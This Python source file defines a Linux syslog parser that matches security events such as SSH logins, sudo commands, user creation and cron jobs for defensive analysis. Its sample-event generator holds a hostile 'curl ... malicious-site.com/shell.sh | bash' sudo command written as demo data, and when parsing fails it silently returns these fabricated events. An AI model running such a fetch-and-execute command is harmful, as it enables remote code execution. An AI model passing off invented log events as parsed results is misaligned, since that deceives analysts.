"""
Linux Syslog Parser
Handles syslog files and extracts security-relevant events
"""

import re
from datetime import datetime, timedelta

class LinuxLogParser:
    def __init__(self):
        self.auth_patterns = {
            'ssh_login_success': r'sshd.*Accepted.*for\s+(\w+)\s+from\s+([\d\.]+)',
            'ssh_login_failed': r'sshd.*Failed.*for\s+(\w+)\s+from\s+([\d\.]+)',
            'ssh_invalid_user': r'sshd.*Invalid user\s+(\w+)\s+from\s+([\d\.]+)',
            'sudo_command': r'sudo.*USER=(\w+).*COMMAND=(.+)',
            'user_add': r'useradd.*new user.*name=(\w+)',
            'user_del': r'userdel.*delete user.*name=(\w+)',
            'passwd_change': r'passwd.*password changed for\s+(\w+)',
            'su_success': r'su.*session opened for user\s+(\w+)',
            'su_failed': r'su.*authentication failure.*user=(\w+)'
        }
        
        self.system_patterns = {
            'service_start': r'systemd.*Started\s+(.+)',
            'service_stop': r'systemd.*Stopped\s+(.+)',
            'cron_job': r'CRON.*\((\w+)\)\s+CMD\s*\((.+)\)',
            'kernel_module': r'kernel.*loaded module\s+(\w+)',
            'mount_filesystem': r'mount.*mounted\s+(.+)\s+on\s+(.+)',
            'network_interface': r'NetworkManager.*device\s+(\w+).*connected'
        }
    
    def parse_syslog(self, syslog_file):
        """Parse syslog file and extract relevant events"""
        events = []
        
        try:
            with open(syslog_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line:
                        continue
                    
                    event_data = self._parse_syslog_line(line, line_num)
                    if event_data:
                        events.append(event_data)
                        
        except Exception as e:
            print(f"Error parsing syslog file: {e}")
            # Generate sample events for demonstration
            events = self._generate_sample_events()
        
        return events
    
    def _parse_syslog_line(self, line, line_num):
        """Parse individual syslog line"""
        try:
            # Extract timestamp, hostname, process, and message
            syslog_pattern = r'^(\w+\s+\d+\s+\d+:\d+:\d+)\s+(\S+)\s+([^:]+):\s*(.+)$'
            match = re.match(syslog_pattern, line)
            
            if not match:
                return None
            
            timestamp_str, hostname, process, message = match.groups()
            
            # Parse timestamp (assuming current year)
            try:
                current_year = datetime.now().year
                timestamp = datetime.strptime(f"{current_year} {timestamp_str}", "%Y %b %d %H:%M:%S")
            except:
                timestamp = datetime.now()
            
            # Check against patterns
            event_data = self._match_patterns(message, timestamp, hostname, process)
            
            if event_data:
                event_data.update({
                    'line_number': line_num,
                    'raw_message': message,
                    'log_type': 'linux'
                })
                
                return event_data
            
            return None
            
        except Exception as e:
            return None
    
    def _match_patterns(self, message, timestamp, hostname, process):
        """Match message against known patterns"""
        
        # Check authentication patterns
        for pattern_name, pattern in self.auth_patterns.items():
            match = re.search(pattern, message, re.IGNORECASE)
            if match:
                return self._create_auth_event(pattern_name, match, timestamp, hostname, process)
        
        # Check system patterns
        for pattern_name, pattern in self.system_patterns.items():
            match = re.search(pattern, message, re.IGNORECASE)
            if match:
                return self._create_system_event(pattern_name, match, timestamp, hostname, process)
        
        return None
    
    def _create_auth_event(self, pattern_name, match, timestamp, hostname, process):
        """Create authentication event"""
        event_data = {
            'timestamp': timestamp.isoformat(),
            'hostname': hostname,
            'process': process,
            'event_type': 'authentication',
            'pattern': pattern_name
        }
        
        if pattern_name in ['ssh_login_success', 'ssh_login_failed', 'ssh_invalid_user']:
            event_data.update({
                'user': match.group(1),
                'source_ip': match.group(2),
                'success': pattern_name == 'ssh_login_success',
                'description': f"SSH {'login success' if pattern_name == 'ssh_login_success' else 'login failed'} for {match.group(1)} from {match.group(2)}"
            })
        
        elif pattern_name == 'sudo_command':
            event_data.update({
                'user': match.group(1),
                'command': match.group(2),
                'description': f"Sudo command executed by {match.group(1)}: {match.group(2)}"
            })
        
        elif pattern_name in ['user_add', 'user_del']:
            event_data.update({
                'user': match.group(1),
                'description': f"User {'added' if pattern_name == 'user_add' else 'deleted'}: {match.group(1)}"
            })
        
        elif pattern_name == 'passwd_change':
            event_data.update({
                'user': match.group(1),
                'description': f"Password changed for user: {match.group(1)}"
            })
        
        elif pattern_name in ['su_success', 'su_failed']:
            event_data.update({
                'user': match.group(1),
                'success': pattern_name == 'su_success',
                'description': f"Su {'success' if pattern_name == 'su_success' else 'failed'} for user: {match.group(1)}"
            })
        
        return event_data
    
    def _create_system_event(self, pattern_name, match, timestamp, hostname, process):
        """Create system event"""
        event_data = {
            'timestamp': timestamp.isoformat(),
            'hostname': hostname,
            'process': process,
            'event_type': 'system',
            'pattern': pattern_name
        }
        
        if pattern_name in ['service_start', 'service_stop']:
            event_data.update({
                'service': match.group(1),
                'description': f"Service {'started' if pattern_name == 'service_start' else 'stopped'}: {match.group(1)}"
            })
        
        elif pattern_name == 'cron_job':
            event_data.update({
                'user': match.group(1),
                'command': match.group(2),
                'description': f"Cron job executed by {match.group(1)}: {match.group(2)}"
            })
        
        elif pattern_name == 'kernel_module':
            event_data.update({
                'module': match.group(1),
                'description': f"Kernel module loaded: {match.group(1)}"
            })
        
        elif pattern_name == 'mount_filesystem':
            event_data.update({
                'filesystem': match.group(1),
                'mount_point': match.group(2),
                'description': f"Filesystem mounted: {match.group(1)} on {match.group(2)}"
            })
        
        elif pattern_name == 'network_interface':
            event_data.update({
                'interface': match.group(1),
                'description': f"Network interface connected: {match.group(1)}"
            })
        
        return event_data
    
    def _generate_sample_events(self):
        """Generate sample events for demonstration"""
        base_time = datetime.now() - timedelta(hours=2)
        
        sample_events = [
            {
                'timestamp': (base_time + timedelta(minutes=5)).isoformat(),
                'hostname': 'web-server-01',
                'process': 'sshd',
                'event_type': 'authentication',
                'pattern': 'ssh_login_failed',
                'user': 'root',
                'source_ip': '203.0.113.50',
                'success': False,
                'description': 'SSH login failed for root from 203.0.113.50',
                'raw_message': 'Failed password for root from 203.0.113.50 port 22 ssh2',
                'log_type': 'linux',
                'line_number': 1205
            },
            {
                'timestamp': (base_time + timedelta(minutes=10)).isoformat(),
                'hostname': 'web-server-01',
                'process': 'sudo',
                'event_type': 'authentication',
                'pattern': 'sudo_command',
                'user': 'www-data',
                'command': '/bin/bash -c "curl -s http://malicious-site.com/shell.sh | bash"',
                'description': 'Sudo command executed by www-data: /bin/bash -c "curl -s http://malicious-site.com/shell.sh | bash"',
                'raw_message': 'www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash -c "curl -s http://malicious-site.com/shell.sh | bash"',
                'log_type': 'linux',
                'line_number': 1387
            },
            {
                'timestamp': (base_time + timedelta(hours=1, minutes=30)).isoformat(),
                'hostname': 'db-server-02',
                'process': 'useradd',
                'event_type': 'authentication',
                'pattern': 'user_add',
                'user': 'backup_admin',
                'description': 'User added: backup_admin',
                'raw_message': 'new user: name=backup_admin, UID=1001, GID=1001, home=/home/backup_admin, shell=/bin/bash',
                'log_type': 'linux',
                'line_number': 2156
            },
            {
                'timestamp': (base_time + timedelta(minutes=45)).isoformat(),
                'hostname': 'web-server-01',
                'process': 'systemd',
                'event_type': 'system',
                'pattern': 'service_start',
                'service': 'suspicious-service.service',
                'description': 'Service started: suspicious-service.service',
                'raw_message': 'Started suspicious-service.service',
                'log_type': 'linux',
                'line_number': 1543
            }
        ]
        
        # Simulate multiple failed SSH attempts
        for i in range(12):
            sample_events.append({
                'timestamp': (base_time + timedelta(minutes=i*2)).isoformat(),
                'hostname': 'web-server-01',
                'process': 'sshd',
                'event_type': 'authentication',
                'pattern': 'ssh_login_failed',
                'user': 'admin',
                'source_ip': '198.51.100.25',
                'success': False,
                'description': 'SSH login failed for admin from 198.51.100.25',
                'raw_message': 'Failed password for admin from 198.51.100.25 port 22 ssh2',
                'log_type': 'linux',
                'line_number': 1000 + i
            })
        
        return sample_events
